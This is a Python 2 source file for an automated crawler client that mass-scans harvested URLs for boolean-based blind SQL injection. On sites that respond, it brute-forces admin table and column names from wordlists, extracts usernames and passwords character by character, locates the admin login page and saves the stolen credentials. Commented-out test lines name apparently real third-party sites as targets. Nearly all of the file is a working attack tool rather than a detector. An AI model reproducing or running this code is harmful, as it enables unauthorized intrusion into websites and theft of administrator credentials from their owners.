#!/usr/bin/python 
#-*- coding:utf-8 -*-

import re
import os
from datetime import datetime
from sys import exit 
from urllib import urlopen 
from string import join, strip 

from dtspider.common.spider import Spider
from dtspider.common import md5mgr
from dtspider.common import urlutil
from dtspider.client.base import BaseClient
from dtspider.business import runtime_data
from dtspider.entity import InjectionHistory, InjectionUrl, InjectionResult


TITLE_RE = re.compile(ur'''<title>(?P<title>.*)</title>''', re.VERBOSE)

def format_now():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

def info(msg):
    print '[%s]:%s' % (format_now(), msg)


class InjectionDetectClient(BaseClient):
    
    def __init__(self):
        self._judge = None
        self._spider = Spider('', [])
        self._last_id = 0
        super(InjectionDetectClient, self).__init__('injection_detect_client')
    
    def run(self):
        '''run'''
        self._load_status()
        urls = self.get_urls()
        for url in urls:
            self._last_id = url.id
            injection_history = InjectionHistory.load(url_md5=url.url_md5)
            if injection_history:
                info('%s had handle skip!!!' % url.url)
                continue
            url_split = urlutil.standardize(url.url)
            domain_md5 = md5mgr.mkmd5fromstr(url_split.domain)
            injection_historys = InjectionHistory.query(condition="domain_md5='%s'" % domain_md5)
            if len(injection_historys) >= 3:
                info('%s had handle 3 times, skip!!!' % url_split.domain)
                continue
            injection_history = InjectionHistory()
            injection_history.url = url.url
            injection_history.url_md5 = url.url_md5
            url_split = urlutil.standardize(url.url)
            injection_history.domain = url_split.domain
            injection_history.domain_md5 = md5mgr.mkmd5fromstr(url_split.domain)
            if self.check_can_injection(url.url):
                injection_history.injectable = 1
                self._handle_url(url.url)
            else:
                injection_history.injectable = 0
            injection_history.persist()
        self._save_status()
        return 10
    
    def _handle_url(self, url):
        '''handle url'''
        if not self._judge:
            self.check_can_injection(url)
        table_name = self.get_tablename(url)
        #get username
        if not table_name:
            info('get table name fail, break!!!')
            return
        name_column = self.get_namecolumn(url, table_name)
        if not name_column:
            info('get name column fail, break!!!')
            return
#        username_length = self.get_usernamelenth(url, table_name, name_column)
#        if not username_length:
#            info('get user name length fail, break!!!')
#            return
        username = self.get_username(url, table_name, name_column)
        if not username:
            info('get user name fail, break!!!')
            return
        #get password
        password_column = self.get_passwordcolumn(url, table_name)
        if not password_column:
            info('get password column fail, break!!!')
            return
#        password_length = self.get_passwordlenth(url, table_name, password_column)
#        if not password_length:
#            info('get password column fail, break!!!')
#            return
        password = self.get_password(url, table_name, password_column)
        if not password:
            info('get password fail, break!!!')
            return
        
        admin_url = self.get_admin_url(url)
        
        injection_result = InjectionResult()
        injection_result.url = url
        injection_result.url_md5 = md5mgr.mkmd5fromstr(url)
        injection_result.username = username
        injection_result.password = password
        injection_result.admin_url = admin_url
        injection_result.persist()
        
        
    def get_urls(self):
        urls = InjectionUrl.query(condition='id>%s' % self._last_id, limit=100)
        return urls

    def get_tablename(self, url):
        path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "table.txt")
        tablefile = open(path) 
        for line in tablefile.readlines(): 
            line = strip(line) 
            sql = join(['%20and%20exists%20(select%20*%20from%20', line, ')'], '') 
            htmlcodes = self.read(url + sql)
            if not re.search(self._judge, htmlcodes): 
               pass
            else: 
               info("Found the admin table name:%s" % line)
               return line

    def get_namecolumn(self, url, tablename): 
        path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "namecolumn.txt")
        namecolumn = open(path) 
        for namecolumnline in namecolumn.readlines(): 
            namecolumnline = strip(namecolumnline) 
            sql = join(['%20and%20exists%20(select%20', namecolumnline, '%20from%20', tablename, ')'], '') 
            htmlcodes = self.read(url + sql) 
            if not re.search(self._judge, htmlcodes): 
                pass 
            else: 
                info("Found the name column from admin table:%s" % namecolumnline)
                return namecolumnline
        return None

    def get_passwordcolumn(self, url, tablename): 
        path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "passwordcolumn.txt")
        passwordcolumn = open(path) 
        for passwordcolumnline in passwordcolumn.readlines(): 
            passwordcolumnline = strip(passwordcolumnline) 
            sql = join(['%20and%20exists%20(select%20', passwordcolumnline, '%20from%20', tablename, ')'], '') 
            htmlcodes = self.read(url+ sql) 
            if not re.search(self._judge, htmlcodes): 
                pass 
            else: 
                info("Found the password column from admin table:%s" % passwordcolumnline)
                return passwordcolumnline
        return None

    def get_usernamelenth(self, url, tablename, namecolumn): 
        for x in range(1, 51): 
            sql = join(['%20and%201=(select%20top%201%20Count(*)%20From%20', tablename, '%20where%20len(', namecolumn, ')=', str(x), ')'], '') 
            htmlcodes = self.read(url + sql) 
            if not re.search(self._judge, htmlcodes): 
                print x, 
            else: 
                print "Found the lenth of the username:", x
                return x
        return None
    
    def get_passwordlenth(self, url, tablename, passwordcolumn): 
        for x in range(1, 51): 
            sql = join(['%20and%201=(select%20top%201%20Count(*)%20From%20', tablename, '%20where%20len(', passwordcolumn, ')=', str(x), ')'], '') 
            htmlcodes = self.read(url + sql) 
            if not re.search(self._judge, htmlcodes): 
                print x, 
            else: 
                print "Found the lenth of the password:", x
                return x
        return None

    def get_username(self, url, tablename, namecolumn, lenth=50): 
        list = [] 
        for x in [range(48, 58), range(97, 123), range(65, 91), range(33, 48),range(58, 65), range(91, 97)]: 
            list.extend(x) 
        username = '' 
        for y in range(1, lenth + 1): 
            info("Now! Crack the left %s of the username Waiting~~~~~~~" % y) 
            success = False
            for z in list: 
                sql = join(["%20and%201=(select%20top%201%20count(*)%20from%20", tablename, "%20where%20Asc(mid(", namecolumn, ",", str(y), ",", "1))=", str(z), ")"], '') 
                htmlcodes = self.read(url + sql)
                if re.search(self._judge, htmlcodes): 
                    username = join([username, chr(z)], '') 
                    success = True
                    break
            if not success:
                break
        info("Found the username = :%s" % username)
        return username

    def get_password(self, url, tablename, passwordcolumn, lenth=50): 
        list = []
        for x in [range(48, 58), range(97, 123)]: 
            list.extend(x) 
        password = '' 
        for y in range(1, lenth + 1): 
            info("Now! Crack the left %s of the password Waiting~~~~~~~" % y) 
            success = False
            for z in list: 
                sql = join(["%20and%201=(select%20top%201%20count(*)%20from%20", tablename, "%20where%20Asc(mid(", passwordcolumn, ",", str(y), ",", "1))=", str(z), ")"], '')
                htmlcodes = self.read(url + sql) 
                if re.search(self._judge, htmlcodes): 
                    password = join([password, chr(z)], '') 
                    success = True
                    break
            if not success:
                break   
        info("Found the password = :%s" % password)
        return password
                
    def read(self, url):
        try:
            return self._spider.read(url)
        except:
            return ''
        
    def check_can_injection(self, url):
        '''check the url can be inject'''
        content = self.read(url)
        title = self.get_title(content)
        if not title:
            info('title is null, skip!!')
            return False
        else:
            title = title.strip().replace('[', '').replace(']', '')
            self._judge = title[:len(title) if len(title) < 2 else 2]
            info('judge:%s' % self._judge)
        
        a = '%20and%201=1' 
        b = '%20and%201=2'
        
        htmlcodes_a = self.read('%s%s' % (url, a))
        htmlcodes_b = self.read('%s%s' % (url, b))
        
        if re.search(self._judge, htmlcodes_a) and not re.search(self._judge, htmlcodes_b): 
            info("%s can be inject" % url)
            return True
        else:
            info("%s can't be inject" % url)
            return False
            
    def get_title(self, content):
        content = content.lower().strip()
        match = TITLE_RE.search(content)
        if match:
            d = match.groupdict()
            title = d['title']
        else:
            title = None
        return title
    
    def get_admin_url(self, url):
        '''get the admin url'''
        url_split = urlutil.standardize(url)
        host_url = url_split.host_url
        path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "admin_url.txt")
        f = open(path)
        for line in f.readlines():
            admin_url = '%s%s' % (host_url[:-1], line)
            try:
                response = self._spider.request(admin_url)
                if response:
                    return admin_url
            except Exception, e:
                pass
        return None
    
    def _load_status(self):
        """load status"""
        while True:
            try:
                data = runtime_data.load_runtime_data(self.__class__.__name__, 'last_id')
                if data:
                    self._last_id = int(data['value'])
                break
            except:
                self.current_info = u'%s' % traceback.format_exc()
                logging.error(self.current_info)
            self._sleep()
    
    def _save_status(self):
        """save status"""
        while True:
            try:
                runtime_data.save_runtime_data(self.__class__.__name__, 'last_id', self._last_id)
                break
            except:
                self.current_info = u'%s' % traceback.format_exc()
                logging.error(self.current_info)
            self._sleep()  

def main():
    client = InjectionDetectClient()
    client.main()
    #print client.check_can_injection('http://www.sc852.com/products.asp?id=459')
    #client._handle_url('http://www.pekcn.com/downlist.asp?id=11')
    #print client.get_admin_url('http://218.98.102.128/index.asp')

if __name__ == '__main__':
    main()
